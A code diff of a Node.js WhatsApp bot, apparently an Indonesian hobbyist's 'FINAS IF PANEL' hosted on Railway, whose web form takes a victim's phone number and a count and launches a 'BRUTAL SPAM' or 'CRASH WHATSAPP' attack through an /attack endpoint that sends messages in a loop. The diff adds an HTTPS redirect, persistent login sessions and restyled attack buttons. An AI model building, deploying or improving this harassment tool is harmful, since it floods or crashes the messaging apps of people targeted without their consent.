@@ -4,11 +4,23 @@ const express = require('express');
 const bodyParser = require('body-parser');
 
 const app = express();
+
+// PAKSA KE HTTPS BIAR BISA AKSES FITUR MODERN
+app.use((req, res, next) => {
+    if (req.headers['x-forwarded-proto'] !== 'https') {
+        return res.redirect(['https://', req.get('Host'), req.url].join(''));
+    }
+    next();
+});
+
 app.use(bodyParser.urlencoded({ extended: true }));
 const port = process.env.PORT || 3000;
 
+// SETTING BIAR LOGIN AWET (LocalAuth)
 const client = new Client({
-    authStrategy: new LocalAuth(),
+    authStrategy: new LocalAuth({
+        dataPath: './sessions' // Ini bakal simpen login lu di server Railway
+    }),
     puppeteer: { 
         headless: true, 
         args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote', '--single-process', '--disable-gpu'] 
@@ -16,12 +28,12 @@ const client = new Client({
 });
 
 client.on('qr', (qr) => {
-    console.log('SCAN QR DI LOGS RAILWAY:');
+    console.log('--- SCAN QR INI DI LOGS RAILWAY ---');
     qrcode.generate(qr, {small: true});
 });
 
 client.on('ready', () => {
-    console.log('✅ FINAS IF PANEL ONLINE!');
+    console.log('✅ FINAS IF PANEL READY & LOGGED IN!');
 });
 
 app.get('/', (req, res) => {
@@ -33,36 +45,28 @@ app.get('/', (req, res) => {
             <style>
                 body { background: #050505; color: #fff; font-family: 'Arial', sans-serif; text-align: center; padding: 20px; }
                 .card { border: 2px solid #bc13fe; background: #000; padding: 20px; border-radius: 20px; box-shadow: 0 0 20px #bc13fe; max-width: 400px; margin: auto; }
-                
-                /* LINK FOTO FIX */
-                .banner { 
-                    width: 100%; 
-                    border-radius: 15px; 
-                    margin-bottom: 15px;
-                    border: 1px solid #bc13fe;
-                }
-                
+                .banner { width: 100%; border-radius: 15px; margin-bottom: 15px; border: 1px solid #bc13fe; }
                 h1 { color: #fff; text-shadow: 0 0 10px #bc13fe; font-size: 24px; }
                 input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #bc13fe; background: #111; color: #fff; }
                 button { background: #bc13fe; color: #fff; font-weight: bold; cursor: pointer; border: none; }
+                .footer { font-size: 10px; color: #444; margin-top: 10px; }
             </style>
         </head>
         <body>
             <div class="card">
-                <img src="https://i.ibb.co/WpyXNbPY/image.png" class="banner">
-                
+                <img src="https://i.ibb.co.com/WpyXNbPY/image.png" class="banner">
                 <h1>FINAS IF PANEL</h1>
-                <p style="color: #00ff00; font-size: 12px;">● SYSTEM ACTIVE</p>
-                
+                <p style="color: #00ff00; font-size: 12px;">● HTTPS SECURE CONNECTION</p>
                 <form action="/attack" method="POST">
-                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
+                    <input type="text" name="number" placeholder="Contoh: 628xxx" required>
                     <select name="type">
                         <option value="spam">💥 BRUTAL SPAM</option>
                         <option value="crash">💀 CRASH WHATSAPP</option>
                     </select>
                     <input type="number" name="count" placeholder="Jumlah" value="10" required>
-                    <button type="submit">EXECUTE ATTACK</button>
+                    <button type="submit">LAUNCH ATTACK</button>
                 </form>
+                <div class="footer">Owner: Finas IF | Status: Connected</div>
             </div>
         </body>
         </html>
@@ -80,7 +84,7 @@ app.post('/attack', async (req, res) => {
             await new Promise(r => setTimeout(r, 1000));
         } catch (e) { console.log(e); }
     }
-    res.send('<h2>Serangan Berhasil Dikirim!</h2><a href="/" style="color:#bc13fe;">Kembali</a>');
+    res.send('<body style="background:#000;color:#bc13fe;text-align:center;padding-top:50px;"><h2>Attack Sent!</h2><a href="/" style="color:white;">Back</a></body>');
 });
 
 app.listen(port, '0.0.0.0', () => {
